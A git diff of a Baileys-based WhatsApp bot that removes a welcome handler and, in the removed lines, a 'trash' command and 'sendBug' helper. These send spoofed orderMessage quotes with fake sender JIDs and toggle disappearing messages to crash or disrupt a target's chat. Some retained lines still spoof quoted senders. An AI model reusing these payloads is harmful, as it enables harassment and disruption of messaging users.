@@ -126,43 +126,7 @@ async function starts() {
 		global.batrei.push(batterylevel)
 		})
 //=================================================//
-hexa.on('group-participants-update', async (anu) => {
-		//if (!welkom.includes(anu.jid)) return
-		try {
-			mem = anu.participants[0]
-			console.log(anu)
-            try {
-            pp_user = await hexa.getProfilePicture(mem)
-            } catch (e) {
-            pp_user = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
-            }
-            try {
-            pp_grup = await hexa.getProfilePicture(anu.jid)
-            } catch (e) {
-            pp_grup = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
-            }
-            if (anu.action == 'add') {
-            mdata = await hexa.groupMetadata(anu.jid)
-            memeg = mdata.participants.length
-        	num = anu.participants[0]
-            anu_user = hexa.contacts[mem]
-            teks = `Halo Sayang @${num.split('@')[0]}\nWelcome in ${mdata.subject}\n\nSilahkan Intro ya sayang\nNama : \nUmur : \nGender : \nAsal : \n\nSemoga Betah dan Jangan Lupa isi`
-	        buff = await getBuffer(`https://api.lolhuman.xyz/api/base/welcome?apikey=${lolkey}&img1=${pp_user}&img2=${pp_grup}&background=https://i.ibb.co/7WK0hqB/a2c095d66e1b.jpg&username=${encodeURI(anu_user.notify)}&member=${memeg}&groupname= ${encodeURI(mdata.subject)}`)
-		    hexa.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
-		}
-            if (anu.action == 'remove') {
-                mdata = await hexa.groupMetadata(anu.jid)
-            	num = anu.participants[0]
-                anu_user = hexa.contacts[mem]
-                memeg = mdata.participants.length
-                out = `Kenapa tuh? kok bisa keluar? \nSayonara @${num.split('@')[0]} we will miss you`
-                buff = await getBuffer(`https://api.lolhuman.xyz/api/base/leave?apikey=${lolkey}&img1=${pp_user}&img2=${pp_grup}&background=https://i.ibb.co/7WK0hqB/a2c095d66e1b.jpg&username=${encodeURI(anu_user.notify)}&member=${memeg}&groupname= ${encodeURI(mdata.subject)}`)
-                hexa.sendMessage(mdata.id, buff, MessageType.image, {caption: out, contextInfo: {"mentionedJid": [num]}})
-            }
-		} catch (e) {
-			console.log('Error : %s', color(e, 'red'))
-		}
-	})
+
 hexa.on('chat-update', async (mek) => {
 	try {
     if (!mek.hasNewMessage) return
@@ -247,12 +211,6 @@ hexa.on('chat-update', async (mek) => {
         const sendMess = (hehe, teks) => {
             hexa.sendMessage(hehe, teks, text)
         }
-        
-        const sendBug = (target, teks) => {
-				hexa.toggleDisappearingMessages(target, 7*24*60*60)
-				hexa.toggleDisappearingMessages(target, 0)
-				sendMess(target, teks)
-				}
 
         const mentions = (teks, memberr, id) => {
             (id == null || id == undefined || id == false) ? hexa.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./stik/wpmobile.png')}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : hexa.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./stik/wpmobile.png')}, extendedText, { sendEphemeral: true, quoted: mek, contextInfo: { "mentionedJid": memberr } })
@@ -265,7 +223,6 @@ hexa.on('chat-update', async (mek) => {
 const freply2 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./stik/thumb.jpeg')
 }}}
 const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16505434800@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail":fs.readFileSync('./stik/thumb.jpeg')}, "title": fake, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
-const y = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '155157279766079', itemCount: '99999999999999999999999999999999999999999999999999999999999999999', status: 'INQUIRY', surface:  'CATALOG', message: 'TROLINYA XAXA', jpegthumnail: fs.readFileSync('./stik/thumb.jpeg'), orderTitle: 'Cuih', sellerJid: '0@s.whatsapp.net', token: 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g==' }}}
         const fakestatus = (teks) => {
             hexa.sendMessage(from, teks, text, {
                 quoted: {
@@ -571,7 +528,7 @@ var ucapanWaktu = 'Selamat Malam'
 		if (!mek.key.fromMe && banChats === true) return		
 switch (command) {
 	case 'owner':
-	sendKontak(from, `${owner}`, 'hexa,', 'Sibukk!!')
+	sendKontak(from, `${owner}`, 'Nino,', 'Sibukk!!')
 	break
     case 'menu':
     case 'help':
@@ -653,59 +610,6 @@ ${readmore}
 • Unread Chat : ${unread.length} Chat`
 hexa.sendMessage(from, { text: menu, jpegThumbnail: fs.readFileSync('./stik/wpmobile.png')}, 'extendedTextMessage', { sendEphemeral: true, quoted: freply2, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [me, senderr] }})
            	break
-case 'trash':
-function troli(nomor){
-hexa.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
-▒▒█▒▒▒▄██████████▄▒▒▒▒
-▒█▐▒▒▒████████████▒▒▒▒
-▒▌▐▒▒██▄▀██████▀▄██▒▒▒
-▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
-▐┼▐▒▒██████████████▒▒▒
-▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
-▒▒█████──────────▐███▌
-▒▒█▀▀██▄█─▄───▐─▄███▀▒
-▒▒█▒▒███████▄██████▒▒▒
-▒▒▒▒▒██████████████▒▒▒
-▒▒▒▒▒██████████████▒▒▒
-▒▒▒▒▒█████████▐▌██▌▒▒▒
-▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
- quoted: {
-  key: {
-   participant: '0@s.whatsapp.net' // Fake sender Jid
-  },
-  message: {
-   orderMessage: {
-thumbnail: fs.readFileSync('./stik/wpmobile.png'),
-    //itemCount: 0, // Bug
-    status: 'INQUIRY',
-    surface: 'CATALOG',
-    message: '☠️Asylum☠️',
-    orderTitle: 'Cuih', // Idk what this does
-    sellerJid: '16504228206@s.whatsapp.net' // Seller
-   }
-  }
- }
-})
-}
-function bug(jid){
-for(let i=0;i < 1;i++){
-var
-WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
-hexa.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
-}}
-async function attack(targett){
-bug(targett)
-await sleep(3000)
-troli(targett)
-await sleep(3000)
-bug(targett)
-}
-
-attack(mek.key.remoteJid)
-break
 case 'getpp':
                     if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
                         linkpp = await hexa.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
